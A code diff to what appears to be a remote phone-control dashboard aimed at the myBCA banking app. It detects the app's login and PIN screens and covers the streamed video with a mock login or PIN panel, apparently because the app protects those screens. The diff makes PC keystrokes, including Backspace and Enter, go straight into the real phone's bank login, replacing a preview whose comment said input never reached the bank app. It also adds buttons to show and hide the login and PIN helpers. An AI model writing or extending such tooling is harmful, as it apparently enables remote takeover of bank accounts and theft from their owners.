@@ -397,12 +397,13 @@ tr:last-child td{border-bottom:0}
    MYBCA SECURE SCREEN HELPER OVERLAY
 ===================================================== */
 .mybca-secure-overlay{
-    position:absolute;inset:0;display:none;z-index:40;
+    position:absolute;inset:0;display:none;z-index:100;
     pointer-events:none;overflow:hidden;background:transparent;
 }
-.mybca-secure-overlay.show{display:block;animation:myBcaSecureIn .15s ease-out both;pointer-events:none}
+.mybca-secure-overlay.show{display:block;animation:myBcaSecureIn .15s ease-out both;pointer-events:none;visibility:visible;opacity:1}
 .mybca-secure-preview{
     position:absolute;overflow:hidden;box-sizing:border-box;
+    min-width:1px;min-height:1px;
     border:0;border-radius:0;background:#f7f8fa;color:#27313b;
     box-shadow:none;display:block;pointer-events:none;user-select:none;
     transform-origin:top left;
@@ -654,7 +655,12 @@ tr:last-child td{border-bottom:0}
             <div class="mybca-helper-actions">
                 <button class="btn small" type="button" onclick="scanMyBcaNow()">⌕ Scan Sekarang</button>
                 <button class="btn small" type="button" onclick="resetMyBcaDetector()">↺ Reset Detector</button>
-                <button class="btn small" type="button" onclick="showToast('Keyboard PC aktif untuk preview dummy; tidak dikirim ke phone.')">⌨ Keyboard Test</button>
+            </div>
+            <div class="mybca-helper-actions">
+                <button class="btn small" type="button" onclick="showMyBcaLoginHelper()">👁 Tampilkan Helper Login</button>
+                <button class="btn small" type="button" onclick="hideMyBcaLoginHelper()">✕ Sembunyikan Helper Login</button>
+                <button class="btn small" type="button" onclick="showMyBcaPinHelper()">🔐 Tampilkan Helper PIN</button>
+                <button class="btn small" type="button" onclick="hideMyBcaPinHelper()">✕ Sembunyikan Helper PIN</button>
             </div>
         </div>
         <div class="viewer-hint">Klik layar = tap &nbsp;•&nbsp; Tarik = swipe &nbsp;•&nbsp; Gunakan tombol bawah untuk Back / Home / Recent</div>
@@ -697,22 +703,34 @@ function syncMyBcaSecurePreviewToVideo() {
     const overlay = document.getElementById("mybcaSecureOverlay");
     const preview = overlay?.querySelector(".mybca-secure-preview");
     const video = document.getElementById("phoneVideo");
-    const screen = document.getElementById("screenArea");
-    if (!overlay || !preview || !video || !screen) return;
-    const videoRect = video.getBoundingClientRect();
-    const screenRect = screen.getBoundingClientRect();
-    if (!videoRect.width || !videoRect.height) return;
-    preview.style.left = `${videoRect.left - screenRect.left}px`;
-    preview.style.top = `${videoRect.top - screenRect.top}px`;
-    preview.style.width = `${videoRect.width}px`;
-    preview.style.height = `${videoRect.height}px`;
+    if (!overlay || !preview || !video) return false;
+
+    const rect = video.getBoundingClientRect();
+    const width = video.offsetWidth || rect.width;
+    const height = video.offsetHeight || rect.height;
+    if (!width || !height) return false;
+
+    // The overlay and video share screenArea as their containing block.
+    // Using offsetLeft/offsetTop avoids viewport/scroll rounding errors.
+    preview.style.left = `${video.offsetLeft}px`;
+    preview.style.top = `${video.offsetTop}px`;
+    preview.style.width = `${width}px`;
+    preview.style.height = `${height}px`;
+    return true;
 }
 
-function renderMyBcaSecureOverlay(state) {
+function renderMyBcaSecureOverlay(state, options = {}) {
     const overlay = document.getElementById("mybcaSecureOverlay");
     const title = document.getElementById("mybcaSecureTitle");
     const body = document.getElementById("mybcaSecureBody");
     if (!overlay || !title || !body) return;
+
+    if (!options.force && myBcaDetector.helperHiddenForState === state) {
+        return;
+    }
+
+    myBcaDetector.manualHelper = !!options.manual;
+    myBcaDetector.helperHiddenForState = null;
 
     const isPin = state === MYBCA_STATES.PIN_VERIFICATION || state === MYBCA_STATES.PIN_ERROR;
     title.textContent = isPin ? "Verifikasi" : "Masuk";
@@ -745,11 +763,44 @@ function renderMyBcaSecureOverlay(state) {
     requestAnimationFrame(syncMyBcaSecurePreviewToVideo);
 }
 
-function hideMyBcaSecureOverlay() {
+function hideMyBcaSecureOverlay(state = null) {
     const overlay = document.getElementById("mybcaSecureOverlay");
     if (!overlay) return;
+    const currentState = state || overlay.dataset.state || myBcaDetector.state || null;
+    if (currentState) myBcaDetector.helperHiddenForState = currentState;
+    myBcaDetector.manualHelper = false;
     overlay.classList.remove("show");
     overlay.setAttribute("aria-hidden", "true");
+}
+
+function showMyBcaLoginHelper() {
+    myBcaDetector.bank = "MYBCA";
+    myBcaDetector.state = MYBCA_STATES.LOGIN;
+    myBcaDetector.pendingSecureState = null;
+    myBcaDetector.helperHiddenForState = null;
+    updateMyBcaHelperUI("Helper Login ditampilkan manual.");
+    renderMyBcaSecureOverlay(MYBCA_STATES.LOGIN, {manual: true, force: true});
+    requestAnimationFrame(syncMyBcaSecurePreviewToVideo);
+}
+
+function showMyBcaPinHelper() {
+    myBcaDetector.bank = "MYBCA";
+    myBcaDetector.state = MYBCA_STATES.PIN_VERIFICATION;
+    myBcaDetector.pendingSecureState = null;
+    myBcaDetector.helperHiddenForState = null;
+    updateMyBcaHelperUI("Helper PIN ditampilkan manual.");
+    renderMyBcaSecureOverlay(MYBCA_STATES.PIN_VERIFICATION, {manual: true, force: true});
+    requestAnimationFrame(syncMyBcaSecurePreviewToVideo);
+}
+
+function hideMyBcaLoginHelper() {
+    hideMyBcaSecureOverlay(MYBCA_STATES.LOGIN);
+    updateMyBcaHelperUI("Helper Login disembunyikan.");
+}
+
+function hideMyBcaPinHelper() {
+    hideMyBcaSecureOverlay(MYBCA_STATES.PIN_VERIFICATION);
+    updateMyBcaHelperUI("Helper PIN disembunyikan.");
 }
 
 function toggleMyBcaPreviewPassword() {
@@ -774,17 +825,32 @@ function myBcaPreviewPinBackspace() {
 }
 
 function myBcaSecureKeyboardTest(event) {
-    // Dashboard-only test: PC keyboard updates the preview, never the bank app.
-    if (myBcaDetector.state !== MYBCA_STATES.LOGIN || !document.getElementById("mybcaSecureOverlay")?.classList.contains("show")) return;
+    // Saat state LOGIN, keyboard PC dikirim ke HP asli melalui DataChannel.
+    // Helper hanya preview/panduan; helper boleh disembunyikan dan input tetap jalan.
+    if (myBcaDetector.state !== MYBCA_STATES.LOGIN) return;
+    if (event.isComposing || event.ctrlKey || event.metaKey || event.altKey) return;
+
     if (event.key === "Backspace") {
         myBcaPreviewInput = myBcaPreviewInput.slice(0, -1);
-        renderMyBcaSecureOverlay(MYBCA_STATES.LOGIN);
+        if (document.getElementById("mybcaSecureOverlay")?.classList.contains("show")) {
+            renderMyBcaSecureOverlay(MYBCA_STATES.LOGIN);
+        }
+        sendViewerInput({ type: "key", keyCode: 67 }); // KEYCODE_DEL
         event.preventDefault();
         return;
     }
-    if (event.key.length === 1 && myBcaPreviewInput.length < 32) {
+
+    if (event.key === "Enter") {
+        sendViewerInput({ type: "key", keyCode: 66 }); // KEYCODE_ENTER
+        event.preventDefault();
+        return;
+    }
+
+    if (event.key.length === 1 && myBcaPreviewInput.length < 64) {
         myBcaPreviewInput += event.key;
-        renderMyBcaSecureOverlay(MYBCA_STATES.LOGIN);
+        if (document.getElementById("mybcaSecureOverlay")?.classList.contains("show")) {
+            renderMyBcaSecureOverlay(MYBCA_STATES.LOGIN);
+        }
         sendViewerInput({ type: "text", text: event.key });
         event.preventDefault();
     }
@@ -812,7 +878,9 @@ const myBcaDetector = {
     activeError: null,
     errorBaseState: null,
     lastDetectedAt: 0,
-    secureOverlayTimer: null
+    secureOverlayTimer: null,
+    helperHiddenForState: null,
+    manualHelper: false
 };
 
 // Semua state myBCA sengaja menyimpan nama bank.
@@ -3410,6 +3478,8 @@ function resetMyBcaDetector() {
     myBcaDetector.pendingSecureState = null;
     myBcaDetector.activeError = null;
     myBcaDetector.errorBaseState = null;
+    myBcaDetector.helperHiddenForState = null;
+    myBcaDetector.manualHelper = false;
     myBcaDetector.lastDetectedAt = 0;
     updateMyBcaHelperUI("Detector di-reset.");
 }
